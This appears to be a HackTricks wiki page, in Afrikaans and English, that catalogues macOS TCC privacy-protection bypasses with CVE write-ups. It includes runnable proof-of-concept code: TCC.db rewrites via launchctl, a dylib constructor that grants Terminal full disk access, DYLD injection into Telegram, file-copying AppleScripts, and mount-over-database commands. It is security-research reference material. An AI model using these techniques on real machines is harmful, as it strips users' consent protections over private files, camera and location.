# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Volgens funksionaliteit

### Write Bypass

Dit is nie 'n bypass nie, dit is net hoe TCC werk: **Dit beskerm nie teen skryf nie**. As Terminal **nie toegang het om die Desktop van 'n gebruiker te lees nie, kan dit steeds daarin skryf**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Die **uitgebreide attribuut `com.apple.macl`** word by die nuwe **file** gevoeg om die **creators app** toegang te gee om dit te lees.

### TCC ClickJacking

Dit is moontlik om **'n venster oor die TCC-prompt te plaas** om die gebruiker dit te laat **aanvaar** sonder dat hy dit opmerk. Jy kan 'n PoC in [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** vind.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

'n Attacker kan **apps met enige naam skep** (bv. Finder, Google Chrome...) in die **`Info.plist`** en dit toegang tot 'n TCC-beskermde ligging laat versoek. Die gebruiker sal dink dat die wettige toepassing die een is wat hierdie toegang versoek.\
Boonop is dit moontlik om die wettige app van die Dock te **verwyder en die fake een daarop te plaas**, sodat dit, wanneer die gebruiker op die fake een klik (wat dieselfde ikoon kan gebruik), die wettige een kan oproep, TCC-permissions kan versoek en malware kan uitvoer, terwyl die gebruiker glo dat die wettige app die toegang versoek het.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Meer inligting en 'n PoC in:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

By verstek het toegang via **SSH vroeër "Full Disk Access" gehad**. Om dit te deaktiveer, moet dit gelys maar gedeaktiveer wees (om dit van die lys te verwyder, sal nie daardie privileges verwyder nie):<sup>[2]</sup>

![TCC Request by arbitrary name - SSH Bypass: By default an access via SSH used to have "Full Disk Access" . In order to disable this you need to have it listed but disabled (removing it...](<../../../../../images/image (1077).png>)

Hier kan jy voorbeelde vind van hoe sommige **malwares hierdie protection kon omseil**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[11]</sup>

> [!CAUTION]
> Let daarop dat jy nou **Full Disk Access** nodig het om SSH te kan aktiveer

### Handle extensions - CVE-2022-26767

Die attribuut **`com.apple.macl`** word aan files toegeken om **'n sekere toepassing permissions te gee om dit te lees.** Hierdie attribuut word gestel wanneer 'n file **gedrag\&drop** word op 'n app, of wanneer 'n gebruiker **'n file dubbelklik om dit met die verstektoepassing oop te maak**.

'n Gebruiker kan dus **'n malicious app registreer** om al die extensions te hanteer en Launch Services oproep om enige file te **open** (sodat die malicious file toegang verleen sal word om dit te lees).

### iCloud

Met die entitlement **`com.apple.private.icloud-account-access`** is dit moontlik om met die **`com.apple.iCloudHelper`** XPC service te kommunikeer, wat **iCloud tokens sal verskaf**.

**iMovie** en **Garageband** het hierdie entitlement en ander gehad wat dit moontlik gemaak het.

Vir meer **inligting** oor die exploit om **icloud tokens** van daardie entitlement te **kry**, kyk na die praatjie: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[12]</sup>

### kTCCServiceAppleEvents / Automation

'n App met die **`kTCCServiceAppleEvents`**-permission sal in staat wees om **ander Apps te beheer**. Dit beteken dat dit moontlik die **permissions wat aan die ander Apps toegeken is, kan misbruik**.

Vir meer inligting oor Apple Scripts, kyk:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Byvoorbeeld, as 'n App **Automation permission oor `iTerm`** het, het **`Terminal`** in hierdie voorbeeld toegang tot iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Oor iTerm

Terminal, wat nie FDA het nie, kan iTerm, wat dit wel het, oproep en dit gebruik om aksies uit te voer:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Via Finder

Of as 'n App toegang via Finder het, kan dit 'n script soos hierdie een wees:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Volgens App gedrag

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Die userland **tccd daemon** het die **`HOME`** **env**-veranderlike gebruik om toegang tot die TCC-users-database te verkry vanaf: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Volgens [hierdie Stack Exchange-plasing](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), en omdat die TCC daemon via **`launchd`** binne die huidige gebruiker se domein loop, is dit moontlik om **alle omgewingsveranderlikes** wat daaraan oorgedra word, te **beheer**.\
Dus kon ’n **attacker** die **`$HOME`**-omgewingsveranderlike in **`launchctl`** stel om na ’n **beheerde** **directory** te wys, die **TCC** daemon te herbegin, en dan die **TCC-database** direk te wysig om aan homself **elke beskikbare TCC-entitlement** te gee sonder om ooit die eindgebruiker te vra.<sup>[1]</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes het toegang gehad tot TCC-beskermde liggings, maar wanneer 'n nota geskep word, word dit **in 'n nie-beskermde ligging geskep**. Jy kon Notes dus vra om 'n beskermde lêer na 'n nota te kopieer (dus na 'n nie-beskermde ligging) en daarna toegang tot die lêer verkry:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Die binary `/usr/libexec/lsd` met die library `libsecurity_translocate` het die entitlement `com.apple.private.nullfs_allow` gehad, wat dit toegelaat het om **nullfs** mounts te skep, en het die entitlement `com.apple.private.tcc.allow` met **`kTCCServiceSystemPolicyAllFiles`** gehad om toegang tot elke lêer te verkry.

Dit was moontlik om die quarantine-attribuut by "Library" te voeg, die **`com.apple.security.translocation`** XPC service te roep, waarna dit Library na **`$TMPDIR/AppTranslocation/d/d/Library`** sou map, waar al die dokumente binne Library **toeganklik** sou wees.

### CVE-2024-44131 - FileProvider symlink race

Apps wat lêerbewerkings aan 'n **bevoorregte helper** (hier **`fileproviderd`** / **`Files.app`**) oorgee, kopieer of skuif items **namens die gebruiker**, sodat die kopie met die helper se privileges eerder as dié van die caller uitgevoer word.

Jamf Threat Labs het gewys dat die symlink-validasie wat voor die bewerking uitgevoer word, **gerace** kan word: in plaas daarvan om die symlink op die **laaste** path component te plaas (wat nagegaan word), vervang die aanvaller 'n **intermediêre** directory van die path **nadat die kopie reeds begin het**. Die bevoorregte helper volg dan die aanvaller-beheerde link en lees/skryf TCC-beskermde liggings **sonder om ooit 'n prompt te wys**.<sup>[7]</sup>

Directories wat **nie deur 'n random UUID in hul path beskerm word nie** (byvoorbeeld `~/Library/Mobile Documents/com~apple~CloudDocs`), is die maklikste teikens, omdat die aanvaller die volledige path kan voorspel om die race uit te voer.

> [!TIP]
> Dit is die generiese patroon waarna gesoek moet word: **enige bevoorregte proses wat 'n path meer as een keer resolve** (check-then-use, of `rename()`/`copyfile()` wat source en destination afsonderlik resolve) kan gerace word deur 'n directory in die middel van die path te vervang. Slegs `O_NOFOLLOW_ANY`, `openat()` op 'n reeds-geopende directory FD, of `realpath()` + re-validation sluit die window werklik.

Meer inligting in [**die Jamf Threat Labs writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[7]</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` kan met `SQLITE_ENABLE_SQLLOG` gebou word, wat 'n logging hook byvoeg wat deur environment variables beheer word ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[8]</sup>

- **`SQLITE_SQLLOG_DIR=path`** – vir **elke database wat oopgemaak word**, word 'n **kopie van die database-lêer** en 'n log van die SQL statements in `path` geskryf (die directory moet reeds bestaan).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – neem **elke keer** wanneer 'n DB oopgemaak of attached word, 'n **nuwe kopie** in plaas daarvan om een te hergebruik.
- **`SQLITE_SQLLOG_CONDITIONAL`** – log slegs 'n connection indien 'n `<database>-sqllog`-lêer langs die hoof-DB bestaan.

As jy hierdie variable in 'n proses kan inject wat **FDA** het en SQLite-databases oopmaak, sal dit graag **daardie beskermde databases kopieer** na 'n directory wat jy beheer. Omdat die destination filename van aanvaller-beheerde data afgelei word, verander 'n **symlink wat by die destination geplaas is** dieselfde primitive in 'n **arbitrary file write** met die teikenproses se privileges.

### **SQLITE_AUTO_TRACE**

As die environment variable **`SQLITE_AUTO_TRACE`** gestel is, sal die library **`libsqlite3.dylib`** alle SQL queries begin **log**. Baie applications het hierdie library gebruik, dus was dit moontlik om al hul SQLite queries te log.

Verskeie Apple applications het hierdie library gebruik om toegang tot TCC-beskermde inligting te verkry.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Soek na env-var-gedrewe lêerskrywings

Die twee vorige inskrywings is voorbeelde van dieselfde generiese tegniek, en dit is die moeite werd om na meer te soek: **frameworks wat in TCC-bevoorregte apps gelaai word, stel dikwels debug/logging-omgewingsveranderlikes bloot wat die proses ’n lêer by ’n pad wat deur die caller beheer word, laat skep**.

Werkvloei om hulle te vind:

1. Kies ’n teiken met FDA of ’n ander waardevolle TCC-permission (`Music`, `TV`, `Terminal`, MDM agents...) en lys die frameworks waaraan dit link (`otool -L`, `vmmap`).
2. Grep daardie frameworks vir `getenv`-strings: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Stel kandidaatveranderlikes via `launchctl setenv NAME /path/you/control`, launch die app en monitor wat dit op die filesystem doen met `fs_usage -w -f filesys <pid>` of `sudo fs_usage | grep <path>`.
4. As die proses ’n lêer in jou directory **skep of hernoem**, het jy ’n write primitive: wys die bestemming na ’n symlink (of race ’n intermediate directory, soos in CVE-2024-44131 hierbo) om dit na `~/Library/Application Support/com.apple.TCC/TCC.db` te herlei.

> [!TIP]
> Twee dinge beperk dit. Eerstens word **`DYLD_*`-veranderlikes geïgnoreer vir hardened-runtime binaries** tensy die app die [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)-entitlement insluit ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — sien ook [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Tweedens verwyder Apple individuele framework-debugveranderlikes nadat hulle gerapporteer is, dus is ’n veranderlike wat op een macOS-release gewerk het, dikwels op die volgende een weg. As ’n app stilweg weier om te launch nadat jy een gestel het, behandel daardie veranderlike asof dit reeds gefilter is.

Kyk na [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) vir die ekwivalente truuk met linker-veranderlikes.

### Apple Remote Desktop

As root kon jy hierdie diens aktiveer, waarna die **ARD agent full disk access sou hê**, wat dan deur ’n gebruiker misbruik kon word om ’n nuwe **TCC user database** te laat kopieer.

## Deur **NFSHomeDirectory**

TCC gebruik ’n databasis in die gebruiker se HOME-folder om toegang tot hulpbronne wat spesifiek aan die gebruiker behoort, te beheer by **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Daarom, as die gebruiker daarin slaag om TCC te herbegin met ’n $HOME-env-veranderlike wat na ’n **ander folder** wys, kan die gebruiker ’n nuwe TCC-databasis in **/Library/Application Support/com.apple.TCC/TCC.db** skep en TCC mislei om enige TCC-permission aan enige app toe te staan.

> [!TIP]
> Let daarop dat Apple die instelling wat binne die gebruiker se profiel gestoor word, in die **`NFSHomeDirectory`**-attribute gebruik vir die **waarde van `$HOME`**. Dus, as jy ’n application compromise met permissions om hierdie waarde te wysig (**`kTCCServiceSystemPolicySysAdminFiles`**) verkry, kan jy hierdie opsie met ’n TCC bypass **weaponize**.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Die **eerste POC** gebruik [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) en [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) om die gebruiker se **HOME**-folder te wysig.

1. Kry ’n _csreq_-blob vir die teiken-app.
2. Plant ’n fake _TCC.db_-lêer met die vereiste toegang en die _csreq_-blob.
3. Export die gebruiker se Directory Services-entry met [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Wysig die Directory Services-entry om die gebruiker se home directory te verander.
5. Import die gewysigde Directory Services-entry met [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Stop die gebruiker se _tccd_ en reboot die proses.

Die tweede POC het **`/usr/libexec/configd`** gebruik, wat `com.apple.private.tcc.allow` gehad het met die waarde `kTCCServiceSystemPolicySysAdminFiles`.\
Dit was moontlik om **`configd`** met die **`-t`**-opsie te run; ’n attacker kon ’n **custom Bundle om te load** spesifiseer. Daarom vervang die exploit die **`dsexport`**- en **`dsimport`**-metode om die gebruiker se home directory te verander met ’n **`configd` code injection**.

Vir meer inligting, kyk na die [**oorspronklike verslag**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[13]</sup>

## Deur process injection

Daar is verskillende tegnieke om code binne ’n proses te inject en sy TCC-privileges te misbruik:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Verder is die algemeenste process injection wat gevind word om TCC te bypass, via **plugins (load library)**.\
Plugins is ekstra code, gewoonlik in die vorm van libraries of plist, wat deur die **main application gelaai** sal word en onder sy context sal uitvoer. Daarom, as die main application toegang tot TCC-beperkte lêers gehad het (via toegekende permissions of entitlements), sal die **custom code dit ook hê**.

### CVE-2020-27937 - Directory Utility

Die application `/System/Library/CoreServices/Applications/Directory Utility.app` het die entitlement **`kTCCServiceSystemPolicySysAdminFiles`** gehad, plugins met die **`.daplug`**-extension gelaai en **nie die hardened** runtime gehad nie.

Om hierdie CVE te weaponize, word die **`NFSHomeDirectory`** **verander** (deur die vorige entitlement te misbruik) om die gebruiker se TCC-databas**is oor te neem** en TCC te bypass.

Vir meer inligting, kyk na die [**oorspronklike verslag**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[14]</sup>

### CVE-2020-29621 - Coreaudiod

Die binary **`/usr/sbin/coreaudiod`** het die entitlements `com.apple.security.cs.disable-library-validation` en `com.apple.private.tcc.manager` gehad. Die eerste het **code injection toegelaat**, en die tweede het dit toegang gegee om **TCC te bestuur**.

Hierdie binary het toegelaat dat **third-party plug-ins** uit die folder `/Library/Audio/Plug-Ins/HAL` gelaai word. Daarom was dit moontlik om **’n plugin te load en die TCC-permissions te misbruik** met hierdie PoC:<sup>[15]</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Vir meer inligting, raadpleeg die [**oorspronklike verslag**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[15]</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Systemtoepassings wat kamerastrome via Core Media I/O oopmaak (toepassings met **`kTCCServiceCamera`**) laai hierdie plugins in die proses vanaf `/Library/CoreMediaIO/Plug-Ins/DAL` (nie deur SIP beperk nie).

Deur bloot ’n library met die algemene **constructor** daar te stoor, sal dit werk om **code te inject**.

Verskeie Apple-toepassings was hiervoor kwesbaar.

### Firefox

Die Firefox-toepassing het die `com.apple.security.cs.disable-library-validation`- en `com.apple.security.cs.allow-dyld-environment-variables`-entitlements gehad:<sup>[16]</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Vir meer inligting oor hoe om dit maklik te exploit, [**lees die oorspronklike verslag**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[16]</sup>

### CVE-2020-10006

Die binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` het die entitlements **`com.apple.private.tcc.allow`** en **`com.apple.security.get-task-allow`** gehad, wat dit moontlik gemaak het om code binne die proses te inject en die TCC privileges te gebruik.

### CVE-2023-26818 - Telegram

Telegram het die entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** en **`com.apple.security.cs.disable-library-validation`** gehad, dus was dit moontlik om dit te abuseer om **toegang tot sy permissions te verkry**, soos om met die camera op te neem. Jy kan [**die payload in die writeup vind**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[17]</sup>

Let op hoe die env variable gebruik is om ’n library te laai: ’n **custom plist** is geskep om hierdie library te inject, en **`launchctl`** is gebruik om dit te launch:<sup>[17]</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Deur open-invocations

Dit is moontlik om **`open`** aan te roep selfs terwyl dit in ’n sandbox is

### Terminal Scripts

Dit is redelik algemeen om Terminal **Full Disk Access (FDA)** te gee, ten minste op rekenaars wat deur tegniese mense gebruik word. En dit is moontlik om **`.terminal`**-scripts daarmee aan te roep.

**`.terminal`**-scripts is plist-lêers soos hierdie een, met die opdrag wat in die **`CommandString`**-sleutel uitgevoer moet word:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
'n Toepassing kan 'n terminal script op 'n ligging soos /tmp skryf en dit met 'n command soos die volgende uitvoer:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Deur mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Enige gebruiker** (selfs onbevoorregte gebruikers) kan 'n Time Machine-snapshot skep en mount, en **toegang tot AL die lêers** van daardie snapshot verkry.\
Die **enigste voorreg** wat benodig word, is dat die toepassing wat gebruik word (soos `Terminal`) **Full Disk Access** (FDA)-toegang (`kTCCServiceSystemPolicyAllfiles`) moet hê, wat deur 'n admin toegestaan moet word.<sup>[2]</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
'n Meer gedetailleerde verduideliking kan in die [**oorspronklike verslag gevind word**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount oor TCC-lêer

Selfs al is die TCC DB-lêer beskerm, was dit moontlik om **'n nuwe TCC.db-lêer oor die gids te mount**:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Kyk na die **full exploit** in die [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Soos verduidelik in die [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), het hierdie CVE `diskarbitrationd` misbruik.<sup>[18]</sup>

Die funksie `DADiskMountWithArgumentsCommon` van die publieke `DiskArbitration`-framework het die sekuriteitskontroles uitgevoer. Dit is egter moontlik om dit te omseil deur `diskarbitrationd` direk aan te roep en daarom `../`-elemente in die pad en symlinks te gebruik.

Dit het ’n aanvaller toegelaat om arbitrêre mounts op enige plek uit te voer, insluitend bo-oor die TCC-database, weens die entitlement `com.apple.private.security.storage-exempt.heritable` van `diskarbitrationd`.

### asr

Die tool **`/usr/sbin/asr`** het toegelaat dat die hele skyf gekopieer en op ’n ander plek gemount word, wat TCC-beskermings omseil het.

### CVE-2022-22655 - Location Services

Location Services word **nie**, soos die ander dienste, in ’n TCC-database gestoor nie. Dit word deur `locationd` bestuur, wat sy eie allow-list in **`/var/db/locationd/clients.plist`** hou:<sup>[5]</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Elke inskrywing word volgens die client (bundle ID of executable path) geïndekseer en bevat velde soos `Authorized`, `BundleId`, `Executable` en `Registered`.

Die `clients.plist`-lêer self word deur Sandbox/TCC beskerm en kan nie eens as root gewysig word nie — maar die **`/var/db/locationd/`-gids was nie teen mounting beskerm nie**. 'n Aanvaller wat as root loop, kon dus 'n disk image bou wat hul eie `clients.plist` bevat (met hul binary as `Authorized` gemerk), dit oor die gids mount, en `locationd` herbegin sodat die vervalste allow-list toegepas word.<sup>[5]</sup>

> [!TIP]
> Dit is dieselfde patroon as die `hdiutil`/`mount` TCC bypasses hierbo: die *lêer* word beskerm, maar die *gids waarin dit geleë is* nie; daarom vervang jy die hele gids in plaas van die lêer.

## Deur startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Deur grep

In verskeie gevalle sal lêers sensitiewe inligting soos e-posadresse, telefoonnommers, boodskappe... in onbeskermde liggings stoor (wat as 'n vulnerability in Apple beskou word).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Dit werk nie meer nie, maar dit [**het in die verlede gewerk**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

'n Ander manier wat [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) gebruik:<sup>[19]</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Verwysings

- [1] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Bypassing macOS TCC User Privacy Protections By Accident and Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [20+ Ways to Bypass Your macOS Privacy Mechanisms](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [4] [Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [5] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [6] [Where in the World is Carmen Sandiego: Abusing Location Services on macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [7] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [8] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [9] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [10] [The Eclectic Light Company - Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [11] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [12] [OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [13] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [14] [Change home directory and bypass TCC aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [15] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [16] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [17] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [18] [Kandji - Uncovering Apple Vulnerabilities: diskarbitrationd and storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
